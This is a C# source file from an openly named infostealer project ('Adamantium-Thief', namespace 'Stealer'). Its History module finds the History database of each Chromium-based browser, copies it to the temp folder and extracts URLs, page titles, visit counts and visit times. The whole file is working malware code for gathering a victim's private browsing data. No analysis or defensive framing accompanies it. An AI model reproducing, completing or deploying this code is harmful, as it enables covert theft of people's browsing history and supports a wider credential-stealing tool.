/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using static Stealer.Common;

namespace Stealer
{
    internal class History
    {
        public static List<Site> Get()
        {
            string SqliteFile = "History";
            List<Site> History = new List<Site>();
            // Database
            string tempHistoryLocation = "";

            // Search all browsers
            foreach (string browser in Paths.chromiumBasedBrowsers)
            {
                string Browser = Paths.GetUserData(browser) + SqliteFile;
                if (File.Exists(Browser))
                {
                    tempHistoryLocation = Environment.GetEnvironmentVariable("temp") + "\\browserHistory";
                    if (File.Exists(tempHistoryLocation))
                    {
                        File.Delete(tempHistoryLocation);
                    }
                    File.Copy(Browser, tempHistoryLocation);
                } else {
                    continue;
                }

                // Read chrome database
                SQLite sSQLite = new SQLite(tempHistoryLocation);
                sSQLite.ReadTable("urls");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string url = Convert.ToString(sSQLite.GetValue(i, 1));
                    string title = Convert.ToString(sSQLite.GetValue(i, 2));
                    int visits = Int32.Parse(Convert.ToString(Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1));
                    string time = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sSQLite.GetValue(i, 5))), TimeZoneInfo.Local));

                    // If no data => break
                    if (string.IsNullOrEmpty(url))
                    {
                        break;
                    }

                    Site credentials = new Site();
                    credentials.hostname = url;
                    credentials.title = Crypt.GetUTF8(title);
                    credentials.visits = visits;
                    credentials.date = time;

                    History.Add(credentials);
                    continue;
                }
                continue;
            }
            return History;
        }
    }
}